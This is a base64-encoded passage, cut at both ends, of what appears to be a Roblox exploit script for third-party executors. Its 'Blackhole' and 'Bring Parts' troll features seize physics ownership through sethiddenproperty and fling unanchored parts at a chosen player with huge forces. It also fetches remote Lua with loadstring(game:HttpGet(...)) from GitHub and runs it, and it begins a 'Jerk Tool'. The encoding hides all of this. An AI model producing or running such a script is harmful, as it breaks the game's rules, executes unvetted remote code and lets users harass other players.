YyNjI0MjQsIDE0LjQ2MjYyNDI0KQogICAgfQoKICAgIE5ldHdvcmsuUmV0YWluUGFydCA9IGZ1bmN0aW9uKHBhcnQpCiAgICAgICAgaWYgdHlwZW9mKHBhcnQpID09ICJJbnN0YW5jZSIgYW5kIHBhcnQ6SXNBKCJCYXNlUGFydCIpIGFuZCBwYXJ0OklzRGVzY2VuZGFudE9mKFdvcmtzcGFjZSkgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQoTmV0d29yay5CYXNlUGFydHMsIHBhcnQpCiAgICAgICAgICAgIHBhcnQuQ3VzdG9tUGh5c2ljYWxQcm9wZXJ0aWVzID0gUGh5c2ljYWxQcm9wZXJ0aWVzLm5ldygwLCAwLCAwLCAwLCAwKQogICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gRW5hYmxlUGFydENvbnRyb2woKQogICAgICAgIExvY2FsUGxheWVyLlJlcGxpY2F0aW9uRm9jdXMgPSBXb3Jrc3BhY2UKICAgICAgICBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgc2V0aGlkZGVucHJvcGVydHkoTG9jYWxQbGF5ZXIsICJTaW11bGF0aW9uUmFkaXVzIiwgbWF0aC5odWdlKQogICAgICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhOZXR3b3JrLkJhc2VQYXJ0cykgZG8KICAgICAgICAgICAgICAgIGlmIHBhcnQ6SXNEZXNjZW5kYW50T2YoV29ya3NwYWNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGFydC5WZWxvY2l0eSA9IE5ldHdvcmsuVmVsb2NpdHkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBFbmFibGVQYXJ0Q29udHJvbCgpCmVuZAoKbG9jYWwgZnVuY3Rpb24gRm9yY2VQYXJ0KHYpCiAgICBpZiB2OklzQSgiUGFydCIpIGFuZCBub3Qgdi5BbmNob3JlZCBhbmQgbm90IHYuUGFyZW50OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBub3Qgdi5QYXJlbnQ6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBhbmQgdi5OYW1lIH49ICJIYW5kbGUiIHRoZW4KICAgICAgICBmb3IgXywgeCBpbiBuZXh0LCB2OkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgaWYgeDpJc0EoIkJvZHlBbmd1bGFyVmVsb2NpdHkiKSBvciB4OklzQSgiQm9keUZvcmNlIikgb3IgeDpJc0EoIkJvZHlHeXJvIikgb3IgeDpJc0EoIkJvZHlQb3NpdGlvbiIpIG9yIHg6SXNBKCJCb2R5VGhydXN0Iikgb3IgeDpJc0EoIkJvZHlWZWxvY2l0eSIpIG9yIHg6SXNBKCJSb2NrZXRQcm9wdWxzaW9uIikgdGhlbgogICAgICAgICAgICAgICAgeDpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgdjpGaW5kRmlyc3RDaGlsZCgiQXR0YWNobWVudCIpIHRoZW4KICAgICAgICAgICAgdjpGaW5kRmlyc3RDaGlsZCgiQXR0YWNobWVudCIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGlmIHY6RmluZEZpcnN0Q2hpbGQoIkFsaWduUG9zaXRpb24iKSB0aGVuCiAgICAgICAgICAgIHY6RmluZEZpcnN0Q2hpbGQoIkFsaWduUG9zaXRpb24iKTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICBpZiB2OkZpbmRGaXJzdENoaWxkKCJUb3JxdWUiKSB0aGVuCiAgICAgICAgICAgIHY6RmluZEZpcnN0Q2hpbGQoIlRvcnF1ZSIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIHYuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgbG9jYWwgVG9ycXVlID0gSW5zdGFuY2UubmV3KCJUb3JxdWUiLCB2KQogICAgICAgIFRvcnF1ZS5Ub3JxdWUgPSBWZWN0b3IzLm5ldygxMDAwMDAwLCAxMDAwMDAwLCAxMDAwMDAwKQogICAgICAgIGxvY2FsIEFsaWduUG9zaXRpb24gPSBJbnN0YW5jZS5uZXcoIkFsaWduUG9zaXRpb24iLCB2KQogICAgICAgIGxvY2FsIEF0dGFjaG1lbnQyID0gSW5zdGFuY2UubmV3KCJBdHRhY2htZW50IiwgdikKICAgICAgICBUb3JxdWUuQXR0YWNobWVudDAgPSBBdHRhY2htZW50MgogICAgICAgIEFsaWduUG9zaXRpb24uTWF4Rm9yY2UgPSBtYXRoLmh1Z2UKICAgICAgICBBbGlnblBvc2l0aW9uLk1heFZlbG9jaXR5ID0gbWF0aC5odWdlCiAgICAgICAgQWxpZ25Qb3NpdGlvbi5SZXNwb25zaXZlbmVzcyA9IDUwMAogICAgICAgIEFsaWduUG9zaXRpb24uQXR0YWNobWVudDAgPSBBdHRhY2htZW50MgogICAgICAgIEFsaWduUG9zaXRpb24uQXR0YWNobWVudDEgPSBBdHRhY2htZW50MQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gdG9nZ2xlQmxhY2tIb2xlKCkKICAgIGJsYWNrSG9sZUFjdGl2ZSA9IG5vdCBibGFja0hvbGVBY3RpdmUKICAgIGlmIGJsYWNrSG9sZUFjdGl2ZSB0aGVuCiAgICAgICAgZm9yIF8sIHYgaW4gbmV4dCwgV29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkgZG8KICAgICAgICAgICAgRm9yY2VQYXJ0KHYpCiAgICAgICAgZW5kCgogICAgICAgIFdvcmtzcGFjZS5EZXNjZW5kYW50QWRkZWQ6Q29ubmVjdChmdW5jdGlvbih2KQogICAgICAgICAgICBpZiBibGFja0hvbGVBY3RpdmUgdGhlbgogICAgICAgICAgICAgICAgRm9yY2VQYXJ0KHYpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBibGFja0hvbGVBY3RpdmUgYW5kIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkgZG8KICAgICAgICAgICAgICAgIGFuZ2xlID0gYW5nbGUgKyBtYXRoLnJhZCgyKQoKICAgICAgICAgICAgICAgIGxvY2FsIG9mZnNldFggPSBtYXRoLmNvcyhhbmdsZSkgKiByYWRpdXMKICAgICAgICAgICAgICAgIGxvY2FsIG9mZnNldFogPSBtYXRoLnNpbihhbmdsZSkgKiByYWRpdXMKCiAgICAgICAgICAgICAgICBBdHRhY2htZW50MS5Xb3JsZENGcmFtZSA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lICogQ0ZyYW1lLm5ldyhvZmZzZXRYLCAwLCBvZmZzZXRaKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgQXR0YWNobWVudDEuV29ybGRDRnJhbWUgPSBDRnJhbWUubmV3KDAsIC0xMDAwLCAwKQogICAgZW5kCmVuZAoKTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICBodW1hbm9pZFJvb3RQYXJ0LCBBdHRhY2htZW50MSA9IHNldHVwUGxheWVyKCkKICAgIGlmIGJsYWNrSG9sZUFjdGl2ZSB0aGVuCiAgICAgICAgdG9nZ2xlQmxhY2tIb2xlKCkKICAgIGVuZAplbmQpCgpsb2NhbCBsaWJyYXJ5ID0gbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9taXJvZXJhbWFhL1R1cnRsZUxpYi9tYWluL1R1cnRsZVVpTGliLmx1YSIpKSgpCmxvY2FsIHdpbmRvdyA9IGxpYnJhcnk6V2luZG93KCLwn4yA77ixQmxhY2tob2xlIEdVSSIpCgp3aW5kb3c6U2xpZGVyKCJJbnNlcnQgdGhlIHJhZGl1czoiLDEsMTAwLDEwLCBmdW5jdGlvbihWYWx1ZSkKICAgcmFkaXVzID0gVmFsdWUKZW5kKQoKd2luZG93OlRvZ2dsZSgiVG9nZ2xlIGJsYWNraG9sZToiLCB0cnVlLCBmdW5jdGlvbihWYWx1ZSkKICAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgICAgdG9nZ2xlQmxhY2tIb2xlKCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGJsYWNrSG9sZUFjdGl2ZSA9IGZhbHNlCiAgICAgICAgZW5kCmVuZCkKCnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpCiAgICAgICAgaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KICAgICAgICAgICAgYW5nbGUgPSBhbmdsZSArIG1hdGgucmFkKGFuZ2xlU3BlZWQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKdG9nZ2xlQmxhY2tIb2xlKCkKICAgIGVuZAp9KQoKClRyb2xsVGFiOkFkZFNlY3Rpb24oeyAi8J+TjO+4sVB1bGwgUGFydHMiIH0pClRyb2xsVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIlB1bGwgUGFydHMiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThCDvuLFHZXQgY2xvc2UgdG8gdGhlIHNlbGVjdGVkIHBsYXllciB0byB1c2UuIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgCgpsb2NhbCBHdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCmxvY2FsIE1haW4gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKbG9jYWwgQm94ID0gSW5zdGFuY2UubmV3KCJUZXh0Qm94IikKbG9jYWwgVUlUZXh0U2l6ZUNvbnN0cmFpbnQgPSBJbnN0YW5jZS5uZXcoIlVJVGV4dFNpemVDb25zdHJhaW50IikKbG9jYWwgTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCmxvY2FsIFVJVGV4dFNpemVDb25zdHJhaW50XzIgPSBJbnN0YW5jZS5uZXcoIlVJVGV4dFNpemVDb25zdHJhaW50IikKbG9jYWwgQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKbG9jYWwgVUlUZXh0U2l6ZUNvbnN0cmFpbnRfMyA9IEluc3RhbmNlLm5ldygiVUlUZXh0U2l6ZUNvbnN0cmFpbnQiKQoKR3VpLk5hbWUgPSAiUFBhcnRzR1VJIgpHdWkuUGFyZW50ID0gZ2V0aHVpKCkKR3VpLlpJbmRleEJlaGF2aW9yID0gRW51bS5aSW5kZXhCZWhhdmlvci5TaWJsaW5nCgpNYWluLk5hbWUgPSAiTWFpbkZyYW1lIgpNYWluLlBhcmVudCA9IEd1aQpNYWluLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig3NSwgNzUsIDc1KQpNYWluLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCk1haW4uQm9yZGVyU2l6ZVBpeGVsID0gMApNYWluLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMzM1OTU0Mjc5LCAwLCAwLjU0MjM2MTk3NSwgMCkKTWFpbi5TaXplID0gVURpbTIubmV3KDAuMjQwMzUwMjYxLCAwLCAwLjE2Njg4MDYyMywgMCkKTWFpbi5BY3RpdmUgPSB0cnVlCk1haW4uRHJhZ2dhYmxlID0gdHJ1ZQoKQm94Lk5hbWUgPSAiQm94IgpCb3guUGFyZW50ID0gTWFpbgpCb3guQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDk1LCA5NSwgOTUpCkJveC5Cb3JkZXJDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQpCb3guQm9yZGVyU2l6ZVBpeGVsID0gMApCb3guUG9zaXRpb24gPSBVRGltMi5uZXcoMC4wOTgwOTI2NDU0LCAwLCAwLjIxODcxMjU4MywgMCkKQm94LlNpemUgPSBVRGltMi5uZXcoMC44MDEwODk5NDIsIDAsIDAuMzY0OTYzNTAyLCAwKQpCb3guRm9udEZhY2UgPSBGb250Lm5ldygicmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Tb3VyY2VTYW5zU2VtaWJvbGQuanNvbiIsIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpCkJveC5QbGFjZWhvbGRlclRleHQgPSAiSW5zZXJ0IHBsYXllciBoZXJlIgpCb3guVGV4dCA9ICIiCkJveC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKQm94LlRleHRTY2FsZWQgPSB0cnVlCkJveC5UZXh0U2l6ZSA9IDI4LjAwMApCb3guVGV4dFdyYXBwZWQgPSB0cnVlCgpVSVRleHRTaXplQ29uc3RyYWludC5QYXJlbnQgPSBCb3gKVUlUZXh0U2l6ZUNvbnN0cmFpbnQuTWF4VGV4dFNpemUgPSAzMQoKTGFiZWwuTmFtZSA9ICJMYWJlbCIKTGFiZWwuUGFyZW50ID0gTWFpbgpMYWJlbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoOTUsIDk1LCA5NSkKTGFiZWwuQm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKTGFiZWwuQm9yZGVyU2l6ZVBpeGVsID0gMApMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAuMTYwNTgzOTQzLCAwKQpMYWJlbC5Gb250RmFjZSA9IEZvbnQubmV3KCJyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL051bml0by5qc29uIiwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCkKTGFiZWwuVGV4dCA9ICJCcmluZyBQYXJ0cyIKTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCkxhYmVsLlRleHRTY2FsZWQgPSB0cnVlCkxhYmVsLlRleHRTaXplID0gMTQuMDAwCkxhYmVsLlRleHRXcmFwcGVkID0gdHJ1ZQoKVUlUZXh0U2l6ZUNvbnN0cmFpbnRfMi5QYXJlbnQgPSBMYWJlbApVSVRleHRTaXplQ29uc3RyYWludF8yLk1heFRleHRTaXplID0gMjEKCkJ1dHRvbi5OYW1lID0gIkJ1dHRvbiIKQnV0dG9uLlBhcmVudCA9IE1haW4KQnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig5NSwgOTUsIDk1KQpCdXR0b24uQm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKQnV0dG9uLkJvcmRlclNpemVQaXhlbCA9IDAKQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMTgzMjg0NDE3LCAwLCAwLjY1Njc2MDk5MSwgMCkKQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC42Mjk0Mjc3OTEsIDAsIDAuMjc3MzcyMjcxLCAwKQpCdXR0b24uRm9udCA9IEVudW0uRm9udC5OdW5pdG8KQnV0dG9uLlRleHQgPSAiQlJJTkciCkJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKQnV0dG9uLlRleHRTY2FsZWQgPSB0cnVlCkJ1dHRvbi5UZXh0U2l6ZSA9IDI4LjAwMApCdXR0b24uVGV4dFdyYXBwZWQgPSB0cnVlCgpVSVRleHRTaXplQ29uc3RyYWludF8zLlBhcmVudCA9IEJ1dHRvbgpVSVRleHRTaXplQ29uc3RyYWludF8zLk1heFRleHRTaXplID0gMjgKCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKbG9jYWwgV29ya3NwYWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKQoKbG9jYWwgY2hhcmFjdGVyCmxvY2FsIGh1bWFub2lkUm9vdFBhcnQKCm1haW5TdGF0dXMgPSB0cnVlClVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBnYW1lUHJvY2Vzc2VkRXZlbnQpCglpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5SaWdodENvbnRyb2wgYW5kIG5vdCBnYW1lUHJvY2Vzc2VkRXZlbnQgdGhlbgoJCW1haW5TdGF0dXMgPSBub3QgbWFpblN0YXR1cwoJCU1haW4uVmlzaWJsZSA9IG1haW5TdGF0dXMKCWVuZAplbmQpCgpsb2NhbCBGb2xkZXIgPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIsIFdvcmtzcGFjZSkKbG9jYWwgUGFydCA9IEluc3RhbmNlLm5ldygiUGFydCIsIEZvbGRlcikKbG9jYWwgQXR0YWNobWVudDEgPSBJbnN0YW5jZS5uZXcoIkF0dGFjaG1lbnQiLCBQYXJ0KQpQYXJ0LkFuY2hvcmVkID0gdHJ1ZQpQYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQpQYXJ0LlRyYW5zcGFyZW5jeSA9IDEKCmlmIG5vdCBnZXRnZW52KCkuTmV0d29yayB0aGVuCglnZXRnZW52KCkuTmV0d29yayA9IHsKCQlCYXNlUGFydHMgPSB7fSwKCQlWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDE0LjQ2MjYyNDI0LCAxNC40NjI2MjQyNCwgMTQuNDYyNjI0MjQpCgl9CgoJTmV0d29yay5SZXRhaW5QYXJ0ID0gZnVuY3Rpb24oUGFydCkKCQlpZiBQYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgUGFydDpJc0Rlc2NlbmRhbnRPZihXb3Jrc3BhY2UpIHRoZW4KCQkJdGFibGUuaW5zZXJ0KE5ldHdvcmsuQmFzZVBhcnRzLCBQYXJ0KQoJCQlQYXJ0LkN1c3RvbVBoeXNpY2FsUHJvcGVydGllcyA9IFBoeXNpY2FsUHJvcGVydGllcy5uZXcoMCwgMCwgMCwgMCwgMCkKCQkJUGFydC5DYW5Db2xsaWRlID0gZmFsc2UKCQllbmQKCWVuZAoKCWxvY2FsIGZ1bmN0aW9uIEVuYWJsZVBhcnRDb250cm9sKCkKCQlMb2NhbFBsYXllci5SZXBsaWNhdGlvbkZvY3VzID0gV29ya3NwYWNlCgkJUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCgkJCXNldGhpZGRlbnByb3BlcnR5KExvY2FsUGxheWVyLCAiU2ltdWxhdGlvblJhZGl1cyIsIG1hdGguaHVnZSkKCQkJZm9yIF8sIFBhcnQgaW4gcGFpcnMoTmV0d29yay5CYXNlUGFydHMpIGRvCgkJCQlpZiBQYXJ0OklzRGVzY2VuZGFudE9mKFdvcmtzcGFjZSkgdGhlbgoJCQkJCVBhcnQuVmVsb2NpdHkgPSBOZXR3b3JrLlZlbG9jaXR5CgkJCQllbmQKCQkJZW5kCgkJZW5kKQoJZW5kCgoJRW5hYmxlUGFydENvbnRyb2woKQplbmQKCmxvY2FsIGZ1bmN0aW9uIEZvcmNlUGFydCh2KQoJaWYgdjpJc0EoIkJhc2VQYXJ0IikgYW5kIG5vdCB2LkFuY2hvcmVkIGFuZCBub3Qgdi5QYXJlbnQ6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGFuZCBub3Qgdi5QYXJlbnQ6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBhbmQgdi5OYW1lIH49ICJIYW5kbGUiIHRoZW4KCQlmb3IgXywgeCBpbiBpcGFpcnModjpHZXRDaGlsZHJlbigpKSBkbwoJCQlpZiB4OklzQSgiQm9keU1vdmVyIikgb3IgeDpJc0EoIlJvY2tldFByb3B1bHNpb24iKSB0aGVuCgkJCQl4OkRlc3Ryb3koKQoJCQllbmQKCQllbmQKCQlpZiB2OkZpbmRGaXJzdENoaWxkKCJBdHRhY2htZW50IikgdGhlbgoJCQl2OkZpbmRGaXJzdENoaWxkKCJBdHRhY2htZW50Iik6RGVzdHJveSgpCgkJZW5kCgkJaWYgdjpGaW5kRmlyc3RDaGlsZCgiQWxpZ25Qb3NpdGlvbiIpIHRoZW4KCQkJdjpGaW5kRmlyc3RDaGlsZCgiQWxpZ25Qb3NpdGlvbiIpOkRlc3Ryb3koKQoJCWVuZAoJCWlmIHY6RmluZEZpcnN0Q2hpbGQoIlRvcnF1ZSIpIHRoZW4KCQkJdjpGaW5kRmlyc3RDaGlsZCgiVG9ycXVlIik6RGVzdHJveSgpCgkJZW5kCgkJdi5DYW5Db2xsaWRlID0gZmFsc2UKCQlsb2NhbCBUb3JxdWUgPSBJbnN0YW5jZS5uZXcoIlRvcnF1ZSIsIHYpCgkJVG9ycXVlLlRvcnF1ZSA9IFZlY3RvcjMubmV3KDEwMDAwMCwgMTAwMDAwLCAxMDAwMDApCgkJbG9jYWwgQWxpZ25Qb3NpdGlvbiA9IEluc3RhbmNlLm5ldygiQWxpZ25Qb3NpdGlvbiIsIHYpCgkJbG9jYWwgQXR0YWNobWVudDIgPSBJbnN0YW5jZS5uZXcoIkF0dGFjaG1lbnQiLCB2KQoJCVRvcnF1ZS5BdHRhY2htZW50MCA9IEF0dGFjaG1lbnQyCgkJQWxpZ25Qb3NpdGlvbi5NYXhGb3JjZSA9IG1hdGguaHVnZQoJCUFsaWduUG9zaXRpb24uTWF4VmVsb2NpdHkgPSBtYXRoLmh1Z2UKCQlBbGlnblBvc2l0aW9uLlJlc3BvbnNpdmVuZXNzID0gMjAwCgkJQWxpZ25Qb3NpdGlvbi5BdHRhY2htZW50MCA9IEF0dGFjaG1lbnQyCgkJQWxpZ25Qb3NpdGlvbi5BdHRhY2htZW50MSA9IEF0dGFjaG1lbnQxCgllbmQKZW5kCgpsb2NhbCBibGFja0hvbGVBY3RpdmUgPSBmYWxzZQpsb2NhbCBEZXNjZW5kYW50QWRkZWRDb25uZWN0aW9uCgpsb2NhbCBmdW5jdGlvbiB0b2dnbGVCbGFja0hvbGUoKQoJYmxhY2tIb2xlQWN0aXZlID0gbm90IGJsYWNrSG9sZUFjdGl2ZQoJaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KCQlCdXR0b24uVGV4dCA9ICJCUklORyBQQVJUU++4sU9OIgoJCWZvciBfLCB2IGluIGlwYWlycyhXb3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSkgZG8KCQkJRm9yY2VQYXJ0KHYpCgkJZW5kCgoJCURlc2NlbmRhbnRBZGRlZENvbm5lY3Rpb24gPSBXb3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24odikKCQkJaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KCQkJCUZvcmNlUGFydCh2KQoJCQllbmQKCQllbmQpCgoJCXNwYXduKGZ1bmN0aW9uKCkKCQkJd2hpbGUgYmxhY2tIb2xlQWN0aXZlIGFuZCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIGRvCgkJCQlBdHRhY2htZW50MS5Xb3JsZENGcmFtZSA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCgkJCWVuZAoJCWVuZCkKCWVsc2UKCQlCdXR0b24uVGV4dCA9ICJCUklORyBQQVJUUyB8IE9GRiIKCQlpZiBEZXNjZW5kYW50QWRkZWRDb25uZWN0aW9uIHRoZW4KCQkJRGVzY2VuZGFudEFkZGVkQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKCQllbmQKCWVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIGdldFBsYXllcihuYW1lKQoJbG9jYWwgbG93ZXJOYW1lID0gc3RyaW5nLmxvd2VyKG5hbWUpCglmb3IgXywgcCBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KCQlsb2NhbCBsb3dlclBsYXllciA9IHN0cmluZy5sb3dlcihwLk5hbWUpCgkJaWYgc3RyaW5nLmZpbmQobG93ZXJQbGF5ZXIsIGxvd2VyTmFtZSkgdGhlbgoJCQlyZXR1cm4gcAoJCWVsc2VpZiBzdHJpbmcuZmluZChzdHJpbmcubG93ZXIocC5EaXNwbGF5TmFtZSksIGxvd2VyTmFtZSkgdGhlbgoJCQlyZXR1cm4gcAoJCWVuZAoJZW5kCmVuZAoKbG9jYWwgcGxheWVyID0gbmlsCgpsb2NhbCBmdW5jdGlvbiBWRE9ZWlFMX2Zha2Vfc2NyaXB0KCkgLS0gQm94LlNjcmlwdCAKCWxvY2FsIHNjcmlwdCA9IEluc3RhbmNlLm5ldygnU2NyaXB0JywgQm94KQoKCXNjcmlwdC5QYXJlbnQuRm9jdXNMb3N0OkNvbm5lY3QoZnVuY3Rpb24oZW50ZXJQcmVzc2VkKQoJCWlmIGVudGVyUHJlc3NlZCB0aGVuCgkJCXBsYXllciA9IGdldFBsYXllcihCb3guVGV4dCkKCQkJaWYgcGxheWVyIHRoZW4KCQkJCUJveC5UZXh0ID0gcGxheWVyLk5hbWUKCQkJCXByaW50KCJQTEFZRVIgRk9VTkQ6IiwgcGxheWVyLk5hbWUpCgkJCWVsc2UKCQkJCXByaW50KCJQTEFZRVIgTk9UIEZPVU5EIikKCQkJZW5kCgkJZW5kCgllbmQpCmVuZApjb3JvdXRpbmUud3JhcChWRE9ZWlFMX2Zha2Vfc2NyaXB0KSgpCmxvY2FsIGZ1bmN0aW9uIEpVQk5RS0lfZmFrZV9zY3JpcHQoKQoJbG9jYWwgc2NyaXB0ID0gSW5zdGFuY2UubmV3KCdTY3JpcHQnLCBCdXR0b24pCgoJc2NyaXB0LlBhcmVudC5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpZiBwbGF5ZXIgdGhlbgoJCQljaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKCQkJaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoJCQl0b2dnbGVCbGFja0hvbGUoKQoJCWVsc2UKCQkJcHJpbnQoIlBMQVlFUiBOT1QgU0VMRUNURUQiKQoJCWVuZAoJZW5kKQplbmQKY29yb3V0aW5lLndyYXAoSlVCTlFLSV9mYWtlX3NjcmlwdCkoKQogICAgZW5kCn0pCgpUcm9sbFRhYjpBZGRTZWN0aW9uKHsgIvCfmI7vuLFUcm9sbCBUb29sIiB9KQoKbG9jYWwgZnVuY3Rpb24gZ2V0SHVtKCkKICAgIGxvY2FsIHBsciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjaGFyID0gcGxyLkNoYXJhY3RlciBvciBwbHIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICByZXR1cm4gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKZW5kCgpsb2NhbCBmdW5jdGlvbiBJc1IxNSgpCiAgICBsb2NhbCBwbHIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2hhciA9IHBsci5DaGFyYWN0ZXIgb3IgcGxyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgaHVtID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGlmIG5vdCBodW0gdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICByZXR1cm4gaHVtLlJpZ1R5cGUgPT0gRW51bS5IdW1hbm9pZFJpZ1R5cGUuUjE1CmVuZAoKVHJvbGxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiSmVyayBUb29sIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGh1bWFub2lkID0gZ2V0SHVtKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGJhY2twYWNrID0gcGxheWVyOldhaXRGb3JDaGlsZCgiQmFja3BhY2siKQogICAgICAgIGlmIG5vdCBodW1hbm9pZCBvciBub3QgYmFja3BhY2sgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgdG9vbCA9IEluc3RhbmNlLm5ldygiVG9vbCIpCiAgICAgICAgdG9vbC5OYW1lID0gIkplcmsiCiAgICAgICAgdG9vbC5Ub29sVGlwID0gIkFISEhIIEVVIF